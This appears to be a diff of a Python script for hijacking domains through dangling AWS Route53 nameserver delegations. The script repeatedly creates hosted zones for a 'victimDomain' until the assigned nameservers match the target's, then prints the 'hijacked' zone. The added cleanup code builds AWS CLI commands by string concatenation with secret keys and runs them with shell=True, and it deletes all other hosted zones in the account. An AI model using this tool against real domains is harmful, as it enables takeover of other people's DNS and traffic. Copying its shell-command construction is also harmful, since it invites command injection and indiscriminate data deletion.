@@ -3,25 +3,14 @@ import sys
 import time
 import traceback
 import dns.resolver
+import subprocess
+import json
 
 accessKey=""
 secretKey=""
 victimDomain=""
 targetNS=[]
 nsRecord=0
-successful_zone_id = ""
-forceDelete=False
-
-
-def force_delete_zones(conn, successful_zone_id=""):
-	# we know we have to be very careful here, there was a successful exploit of the vulnerability, and we don't want to reverse that
-	print "This is the list of the hosted zones"
-	print str(conn.list_hosted_zones())
-	for zone in conn.list_hosted_zones():
-		if zone.__dict__["comment"] == "zaheck":
-			if zone.__dict__["id"] != successful_zone_id:
-				zone_to_delete = conn.get_hosted_zone_by_id(zone.__dict__["id"])
-				zone_to_delete.delete()
 
 
 class bcolors:
@@ -63,13 +52,13 @@ def myPrint(text, type):
 	if(type=="SECURE"):
 		print bcolors.OKGREEN+bcolors.BOLD+text+bcolors.ENDC
 
-#python NSTakeover.py -d domain -a accessKey -s secretKey -ns a,b,c,d
+#python NSBrute.py -d domain -a accessKey -s secretKey -ns a,b,c,d
 
 
 if (len(sys.argv)<7):
 	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
 	print ""
-	myPrint("Usage: python NSBrute.py -d domain -a accessKey -s secretKey","ERROR")
+	myPrint("Usage: python NSTakeover.py -d domain -a accessKey -s secretKey","ERROR")
 	myPrint("Please try again!!", "ERROR") 
 	print ""
 	exit(1);
@@ -79,9 +68,6 @@ if (sys.argv[3]=="-a" or sys.argv[3]=="--accessId"):
 	accessKey=sys.argv[4]
 if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
 	secretKey=sys.argv[6]
-if (len(sys.argv) == 8):
-	if (sys.argv[7]=="-f" or sys.argv[7]=="--forceDelete"):
-		forceDelete = True
 try:
 	nsRecords = dns.resolver.query(victimDomain, 'NS')
 except:
@@ -112,9 +98,11 @@ conn = route53.connect(
 # 	zone.delete()
 # 	print i
 # 	i=i+1
-
+created_zones = []
+successful_zone = []
 counter=0
-try:	
+try:
+
 	while True:
 		counter=counter+1
 		myPrint("Iteration Count: "+str(counter),"INFO_WS")
@@ -123,6 +111,8 @@ try:
 			new_zone, change_info = conn.create_hosted_zone(
 		    victimDomain, comment='zaheck'
 			)
+			hosted_zone_id = new_zone.__dict__["id"]
+			created_zones.append(hosted_zone_id)
 			#Erroneous Condition
 			if new_zone is None:
 				continue
@@ -130,18 +120,17 @@ try:
 			myPrint("Created a new zone with following NS: ","INFO_WS")
 			myPrint("".join(nsAWS),"INFO_WS")
 			intersection=set(nsAWS).intersection(set(targetNS))
-			print "This is intersection: " + str(intersection)
-			print "This is the len(intersection): " + str(len(intersection))
 			if(len(intersection)==0):
 				myPrint("No common NS found, deleting new zone","ERROR")
 				print ""
-				print new_zone.__dict__["id"]
 				new_zone.delete()
-				print "The zone should have been deleted successfully"
 			else:
-				successful_zone_id = new_zone.id
 				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
 				myPrint("Check your AWS account, the work is done!","SECURE")
+				print "This is the hijacked Zone ID: " + str(hosted_zone_id)
+				print "This is the zone you hijacked: " + str(intersection)
+				successful_zone.append(hosted_zone_id)
+				created_zones.remove(hosted_zone_id)
 				print ""
 				break
 		except Exception as e:
@@ -150,10 +139,60 @@ try:
 			if new_zone != 0:
 				new_zone.delete()
 			continue
+
 except KeyboardInterrupt:	
-	if forceDelete:
-		print
-		print "Ensuring that all zones are force deleted"
-		force_delete_zones(conn, successful_zone_id)
+	if len(created_zones) != 0:
+		command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
+		out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+		# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "list-hosted-zones"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+		stdout,stderr = out.communicate()
+		print("This is stdout: " + str(stdout))
+		print("This is stderr: " + str(stderr))
+		json_data = None
+		if stdout != 'false':
+			print("Inside of IF1")
+			json_data = json.loads(stdout)
+		remaining_zones = []
+		for zone in json_data["HostedZones"]:
+			remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))
+
+		if len(successful_zone) != 0:
+			remaining_zones.remove(successful_zone[0])
+
+		for zone in remaining_zones:
+			command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
+			# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "delete-hosted-zone", "--id " + zone], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+			print("This is the command I am about to run: " + str(command))
+			out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+			stdout,stderr = out.communicate()
+			print("This is stdout: " + str(stdout))
+			print("This is stderr: " + str(stderr))
+
 	else:
 		exit()
+
+command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
+out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "list-hosted-zones"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+stdout,stderr = out.communicate()
+print("This is stdout: " + str(stdout))
+print("This is stderr: " + str(stderr))
+json_data = None
+if stdout != 'false':
+	print("Inside of IF2")
+	json_data = json.loads(stdout)
+remaining_zones = []
+for zone in json_data["HostedZones"]:
+	remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))
+
+if len(successful_zone) != 0:
+	remaining_zones.remove(successful_zone[0])
+
+for zone in remaining_zones:
+	command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
+	# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "delete-hosted-zone", "--id " + zone], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+	print("This is the command I am about to run: " + str(command))
+	out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+	stdout,stderr = out.communicate()
+	print("This is stdout: " + str(stdout))
+	print("This is stderr: " + str(stderr))
